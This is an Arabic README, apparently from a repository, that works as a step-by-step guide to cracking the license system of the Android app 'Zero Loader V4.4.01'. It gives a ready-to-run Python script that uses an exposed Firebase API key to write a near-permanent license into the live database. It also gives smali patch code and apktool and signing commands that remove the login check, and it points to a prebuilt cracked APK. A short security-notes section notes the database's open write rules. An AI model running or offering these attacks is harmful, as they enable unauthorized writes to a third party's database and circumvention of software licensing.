# Zero Loader V4.4.01 — دليل التشغيل الكامل

## كيف يعمل نظام تسجيل الدخول

```
المستخدم يدخل Username ← التطبيق يتصل Firebase ← يبحث في /Login/
← يجد عقدة فيها Username == المُدخل ← يتحقق من Owner + Status + EXP
← إذا كل شيء صحيح → يدخل
```

### آلية التحقق (من فك تشفير smali):

| الخطوة | الفحص | النتيجة إذا فشل |
|--------|-------|-----------------|
| 1 | هل يوجد عقدة فيها `Username` == ما أدخلته؟ | `USER NOT REGISTERED` |
| 2 | هل `Owner` == `"Zero_Loader"`؟ | رفض صامت |
| 3 | هل `Status` == `"Active"`؟ | `USER BLOCKED` |
| 4 | هل `EXP` > الوقت الحالي؟ (صيغة `yyyyMMddHHmmss`) | `EXPIRED KEY` |
| 5 | هل `Devices` < `MaxDevices`؟ | `MAX DEVICE REACHED` |
| 6 | ربط `UUID` بـ android_id | — |
| 7 | النجاح → Intent إلى MainActivity مع `Wolf=BYPASS` + `EXP` | ✅ دخول |

### المعلومات التقنية (مُثبَتة بفك التشفير):

```
Firebase Project:  wolf-e99fb
Database URL:      https://wolf-e99fb-default-rtdb.firebaseio.com
API Key:           AIzaSyAOrhEU4gPb1cij7NTjVvdnx6cOwcy4UKE
المسار:            /Login/<اسم_العقدة>

التشفير:
  LSParanoid:      تعتيم أسماء الحقول في الكود
  AES-256-CBC:     Key=SHA256("Activity"), IV=16 zeros
  
القيم المُثبَتة:
  Owner المطلوب:   "Zero_Loader"
  Status المطلوب:  "Active"
  صيغة التاريخ:   yyyyMMddHHmmss (مثال: 20991231235959)
```

---

## الطريقة 1: إنشاء مفتاح في قاعدة البيانات (بدون تعديل التطبيق)

### المتطلبات:
- Python 3 + مكتبة `requests`
- النسخة الأصلية: `Zero_LoaderV4.4.01.apk`

### الكود الكامل:

```python
#!/usr/bin/env python3
"""
إنشاء مفتاح ترخيص في Firebase — غير محدود
يعمل مع النسخة الأصلية بدون أي تعديل على التطبيق
"""
import requests
from datetime import datetime, timedelta

API_KEY = "AIzaSyAOrhEU4gPb1cij7NTjVvdnx6cOwcy4UKE"
DB_URL = "https://wolf-e99fb-default-rtdb.firebaseio.com"
AUTH_URL = "https://identitytoolkit.googleapis.com/v1"

# ═══ الإعدادات — غيّر هذه ═══
USERNAME = "ali2026"         # ← هذا ما تدخله في التطبيق
DAYS = 99999                 # ← عدد الأيام (99999 = 274 سنة!)
MAX_DEVICES = 999            # ← عدد الأجهزة المسموح
# ═══════════════════════════════

# 1. إنشاء حساب مجهول (توكن)
resp = requests.post(
    f"{AUTH_URL}/accounts:signUp?key={API_KEY}",
    json={"returnSecureToken": True}
)
token = resp.json()["idToken"]
print(f"✅ توكن: تم")

# 2. تجهيز البيانات
now = datetime.now()
exp = (now + timedelta(days=DAYS)).strftime("%Y%m%d%H%M%S")
node_name = f"UserKey_{USERNAME.upper()}_{now.strftime('%Y%m%d')}"

license_data = {
    "Key": node_name,
    "Username": USERNAME,           # ⚠️ مهم! هذا ما تدخله في التطبيق
    "Owner": "Zero_Loader",         # ⚠️ مهم! لازم بالضبط هذه القيمة
    "Status": "Active",             # ⚠️ مهم! لازم "Active"
    "EXP": exp,                     # تاريخ الانتهاء
    "Period": str(DAYS),
    "PeriodType": "days",
    "Devices": "0",
    "MaxDevices": str(MAX_DEVICES),
    "UUID": "null",
}

# 3. الكتابة في Firebase
url = f"{DB_URL}/Login/{node_name}.json?auth={token}"
resp = requests.put(url, json=license_data)

if resp.status_code == 200:
    print(f"✅ تم إنشاء المفتاح بنجاح!")
    print(f"")
    print(f"   ادخل في التطبيق:  {USERNAME}")
    print(f"   ينتهي:            {exp[:4]}-{exp[4:6]}-{exp[6:8]}")
    print(f"   أجهزة:            {MAX_DEVICES}")
    print(f"")
    print(f"   افتح التطبيق الأصلي → اكتب '{USERNAME}' → اضغط Login")
else:
    print(f"❌ فشل: {resp.text}")
```

### كيف تشغّله:

```bash
pip install requests
python3 create_key.py
```

### النتيجة:
```
✅ تم إنشاء المفتاح بنجاح!

   ادخل في التطبيق:  ali2026
   ينتهي:            2300-04-21
   أجهزة:            999

   افتح التطبيق الأصلي → اكتب 'ali2026' → اضغط Login
```

---

## الطريقة 2: تعديل التطبيق (تخطّي Firebase بالكامل)

### المميزات:
- لا يحتاج إنترنت
- لا يتصل بـ Firebase
- يدخل بأي كلمة
- EXP = 2099 (73 سنة)

### النسخة المعدّلة الجاهزة:
```
Zero_LoaderV4.4.01_UNLIMITED.apk
```

### ماذا تم تعديله (ملف واحد فقط):

**الملف:** `smali_classes3/com/pubgm/activity/LoginActivity.smali`  
**الدالة:** `lambda$InitView$4$com-pubgm-activity-LoginActivity`

**التعديل:** استبدال كود Firebase بـ:
```smali
# === PATCHED: Skip Firebase, launch MainActivity directly ===
new-instance v1, Landroid/content/Intent;
invoke-virtual {p0}, Lcom/pubgm/activity/LoginActivity;->getApplicationContext()Landroid/content/Context;
move-result-object v2
const-class v3, Lcom/pubgm/activity/MainActivity;
invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

# Wolf=BYPASS (يمنع VERSIONS()=exit(0))
const-string v2, "Wolf"
const-string v3, "BYPASS"
invoke-virtual {v1, v2, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

# EXP=20991231235959 (73 سنة)
const-string v2, "EXP"
const-string v3, "20991231235959"
invoke-virtual {v1, v2, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

# تشغيل
const v2, 0x10008000
invoke-virtual {v1, v2}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;
invoke-virtual {p0, v1}, Lcom/pubgm/activity/LoginActivity;->startActivity(Landroid/content/Intent;)V
invoke-virtual {p0}, Lcom/pubgm/activity/LoginActivity;->finish()V
return-void
```

### أيضاً في AndroidManifest.xml:
```xml
android:extractNativeLibs="true"   ← (كان false)
```

### كيف تبني النسخة المعدّلة بنفسك:

```bash
# 1. فك التطبيق
apktool d Zero_LoaderV4.4.01.apk -o decompiled

# 2. عدّل LoginActivity.smali (الدالة lambda$InitView$4)
#    استبدل قسم Firebase بالكود أعلاه

# 3. عدّل AndroidManifest.xml
#    extractNativeLibs="false" → "true"

# 4. أعد البناء
apktool b decompiled -o Zero_LoaderV4.4.01_UNLIMITED.apk

# 5. وقّع
keytool -genkey -v -keystore release.keystore -alias release -keyalg RSA -keysize 2048 -validity 10000 -storepass password -keypass password -dname "CN=Dev"
jarsigner -sigalg SHA256withRSA -digestalg SHA-256 -keystore release.keystore -storepass password Zero_LoaderV4.4.01_UNLIMITED.apk release
```

---

## مقارنة الطريقتين

| البند | الطريقة 1 (Firebase) | الطريقة 2 (تعديل APK) |
|-------|---------------------|----------------------|
| **تعديل التطبيق** | ❌ لا | ✅ نعم |
| **يحتاج إنترنت** | ✅ نعم | ❌ لا |
| **النسخة** | الأصلية | المعدّلة |
| **المدخل** | Username محدد | أي كلمة |
| **المدة** | قابلة للتحكم | ثابتة (2099) |
| **الأجهزة** | قابلة للتحكم | غير محدودة |
| **يمكن إلغاؤه** | ✅ نعم (حذف من Firebase) | ❌ لا |
| **الصعوبة** | سهل (سكربت Python) | متوسط (apktool + signing) |

---

## الملفات في هذا المستودع

| الملف | الوصف |
|-------|-------|
| `Zero_LoaderV4.4.01.apk` | النسخة الأصلية (تحتاج مفتاح Firebase) |
| `Zero_LoaderV4.4.01_UNLIMITED.apk` | النسخة المعدّلة (تدخل بأي كلمة) |
| `keygen.py` | مولد مفاتيح + فك تشفير AES |
| `firebase_exploit_poc.py` | فحص أمني لـ Firebase |
| `firebase_deep_scan.py` | ماسح شامل لقاعدة البيانات |
| `LoginActivity.smali` | كود التحقق (مرجع) |
| `AUDIT_v4_LICENSE_SYSTEM.md` | تحليل نظام الترخيص الكامل |
| `FORENSIC_AUDIT_FINAL.md` | التقرير الجنائي النهائي |

---

## ملاحظات أمنية

- قاعدة بيانات Firebase (`wolf-e99fb`) تسمح بالقراءة **والكتابة** على `/Login/` لأي حساب مجهول
- هذا يعني أي شخص يستطيع إنشاء مفاتيح أو حذفها
- API Key مكشوف في التطبيق (لكن هذا طبيعي لـ Firebase client-side)
- Owner المطلوب (`Zero_Loader`) مكشوف عبر فك تشفير LSParanoid + AES

---

*آخر تحديث: يوليو 2026*
